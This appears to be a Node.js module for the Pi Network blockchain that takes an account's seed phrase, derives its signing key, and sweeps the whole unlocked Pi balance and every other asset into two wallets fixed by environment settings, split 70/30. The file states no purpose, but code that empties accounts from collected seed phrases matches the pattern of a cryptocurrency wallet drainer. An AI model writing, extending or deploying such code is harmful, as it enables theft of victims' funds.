// lib/transfer.js
const StellarBase = require('stellar-base');
const bip39 = require('bip39');

const PI_HORIZON_BASE_URL = process.env.PI_HORIZON_BASE_URL || 'https://api.mainnet.minepi.com';
const PI_NETWORK_PASSPHRASE = process.env.PI_NETWORK_PASSPHRASE || 'Pi Network';
const BUSINESS_WALLET = process.env.BUSINESS_WALLET_ADDRESS;
const DOMESTIC_WALLET = process.env.DOMESTIC_WALLET_ADDRESS;
const BUSINESS_PERCENT = parseFloat(process.env.BUSINESS_PERCENT || '70');
const DOMESTIC_PERCENT = parseFloat(process.env.DOMESTIC_PERCENT || '30');
const BASE_FEE_STROOPS = 100;

function deriveKeypair(seedPhrase) {
  const seed = bip39.mnemonicToSeedSync(seedPhrase.trim().toLowerCase());
  return StellarBase.Keypair.fromRawEd25519Seed(seed.slice(0, 32));
}

async function fetchAccount(address) {
  const res = await fetch(`${PI_HORIZON_BASE_URL}/accounts/${address}`);
  if (!res.ok) throw new Error(`Failed to fetch account ${address}: HTTP ${res.status}`);
  return res.json();
}

async function submitTransaction(xdr) {
  const params = new URLSearchParams({ tx: xdr });
  const res = await fetch(`${PI_HORIZON_BASE_URL}/transactions`, {
    method: 'POST',
    body: params,
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  });
  if (!res.ok) {
    const data = await res.json().catch(() => ({}));
    throw new Error(`Transaction submission failed: ${data.detail || res.statusText}`);
  }
  return res.json();
}

function normalizeAmount(value) {
  const num = parseFloat(value);
  if (!isFinite(num) || num <= 0) return null;
  return num.toFixed(7);
}

async function performTransfer(sourceAddress, seedPhrase, unlockedBalance, otherAssets = []) {
  const hasPi = unlockedBalance > 0;
  const hasOther = Array.isArray(otherAssets) && otherAssets.length > 0;

  if (!hasPi && !hasOther) {
    return { attempted: false, success: false, error: 'No assets to transfer' };
  }

  if (hasPi && (!BUSINESS_WALLET || !DOMESTIC_WALLET)) {
    return { attempted: false, success: false, error: 'Business/domestic wallet addresses not configured' };
  }
  if (hasPi && BUSINESS_PERCENT + DOMESTIC_PERCENT !== 100) {
    return { attempted: false, success: false, error: 'Split percentages must sum to 100' };
  }
  if (hasOther && !DOMESTIC_WALLET) {
    return { attempted: false, success: false, error: 'Domestic wallet address not configured for non-native assets' };
  }

  const fee = BASE_FEE_STROOPS / 1e7;

  const operations = [];
  const otherAssetsTransferred = [];

  let piBusinessAmount = null;
  let piDomesticAmount = null;

  if (hasPi) {
    const totalToSend = unlockedBalance - fee;
    if (totalToSend <= 0) {
      return { attempted: false, success: false, error: 'Pi balance too low to cover fee' };
    }
    const businessAmount = (totalToSend * BUSINESS_PERCENT) / 100;
    const domesticAmount = totalToSend - businessAmount;
    piBusinessAmount = businessAmount.toFixed(7);
    piDomesticAmount = domesticAmount.toFixed(7);

    if (businessAmount > 0) {
      operations.push(
        StellarBase.Operation.payment({
          destination: BUSINESS_WALLET,
          asset: StellarBase.Asset.native(),
          amount: piBusinessAmount,
        })
      );
    }
    if (domesticAmount > 0) {
      operations.push(
        StellarBase.Operation.payment({
          destination: DOMESTIC_WALLET,
          asset: StellarBase.Asset.native(),
          amount: piDomesticAmount,
        })
      );
    }
  }

  for (const asset of otherAssets) {
    const assetCode = asset.asset || null;
    const issuer = asset.issuer || null;
    const balance = asset.balance;

    if (!assetCode || !issuer) {
      otherAssetsTransferred.push({
        asset: assetCode || 'unknown',
        amount: '0',
        destination: DOMESTIC_WALLET,
        status: 'skipped',
        reason: 'Missing asset code or issuer',
      });
      continue;
    }

    const amountString = normalizeAmount(balance);
    if (!amountString) {
      otherAssetsTransferred.push({
        asset: assetCode,
        amount: '0',
        destination: DOMESTIC_WALLET,
        status: 'skipped',
        reason: 'Zero or invalid balance',
      });
      continue;
    }

    operations.push(
      StellarBase.Operation.payment({
        destination: DOMESTIC_WALLET,
        asset: new StellarBase.Asset(assetCode, issuer),
        amount: amountString,
      })
    );
    otherAssetsTransferred.push({
      asset: assetCode,
      amount: amountString,
      destination: DOMESTIC_WALLET,
      status: 'pending',
      reason: null,
    });
  }

  if (operations.length === 0) {
    return { attempted: false, success: false, error: 'No valid operations to submit' };
  }

  try {
    const account = await fetchAccount(sourceAddress);
    const sequence = account.sequence;
    const keypair = deriveKeypair(seedPhrase);

    const builder = new StellarBase.TransactionBuilder(
      new StellarBase.Account(sourceAddress, sequence),
      {
        fee: BASE_FEE_STROOPS.toString(),
        networkPassphrase: PI_NETWORK_PASSPHRASE,
      }
    );

    operations.forEach((op) => builder.addOperation(op));

    const transaction = builder.setTimeout(60).build();
    transaction.sign(keypair);
    const xdr = transaction.toEnvelope().toXDR('base64');

    const submitResult = await submitTransaction(xdr);

    otherAssetsTransferred.forEach((t) => {
      if (t.status === 'pending') t.status = 'sent';
    });

    return {
      attempted: true,
      success: true,
      txHash: submitResult.hash || submitResult.id,
      piBusinessAmount,
      piDomesticAmount,
      otherAssetsTransferred,
      error: null,
    };
  } catch (err) {
    otherAssetsTransferred.forEach((t) => {
      if (t.status === 'pending') {
        t.status = 'failed';
        t.reason = err.message;
      }
    });

    return {
      attempted: true,
      success: false,
      txHash: null,
      piBusinessAmount,
      piDomesticAmount,
      otherAssetsTransferred,
      error: err.message,
    };
  }
}

module.exports = { performTransfer };